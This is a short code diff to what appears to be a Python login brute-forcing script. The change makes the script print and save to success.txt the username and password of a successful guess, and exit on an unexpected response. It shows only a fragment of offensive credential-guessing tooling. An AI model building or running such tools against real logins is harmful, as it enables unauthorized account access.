@@ -31,7 +31,11 @@ def login(data):
         print("failed")
     elif(success in response.text):
         print("success")
+        print(data.get('uname'), data.get('passwd'))
+        with open('success.txt', 'w') as f:
+            f.write(f"Username: {data.get('uname')}, Password: {data.get('passwd')}\n")
     else:
         print(response.content)
+        exit(0)
     
 brute_force()
